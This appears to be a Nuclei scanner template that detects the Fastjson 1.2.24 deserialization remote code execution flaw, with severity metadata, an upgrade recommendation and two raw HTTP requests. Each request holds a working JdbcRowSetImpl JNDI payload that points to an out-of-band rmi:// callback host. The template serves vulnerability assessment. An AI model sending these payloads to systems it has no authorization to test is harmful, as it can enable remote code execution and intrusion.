id: fastjson-1-2-24-rce
info:
  name: Fastjson 1.2.24 - Remote Code Execution
  author: zh
  severity: critical
  description: Fastjson 1.2.24 has a vulnerability that allows for remote code execution
    through deserialization.
  reference:
  - https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.24-rce
  - https://www.freebuf.com/vuls/208339.html
  - https://github.com/wyzxxz/fastjson_rce_tool
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: fastjson,rce,deserialization,oast,vulhub
  metadata:
    impact: The impact of the Fastjson 1.2.24 vulnerability could be severe as it
      allows for remote code execution, potentially leading to unauthorized access
      and control over affected systems.
    recommendation: It is recommended to upgrade to a newer version of Fastjson to
      address the deserialization remote code execution vulnerability.
requests:
- raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \
    \  \"b\":{\n        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n        \"dataSourceName\"\
    :\"rmi://{{interactsh-url}}/Exploit\",\n        \"autoCommit\":true\n    }\n}\n"
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \
    \ \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n   \"dataSourceName\":\"rmi://{{interactsh-url}}/Exploit\"\
    ,\n   \"autoCommit\":true\n}\n"
  stop-at-first-match: true
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: word
    condition: and
    words:
    - Internal Server Error
    - '500'
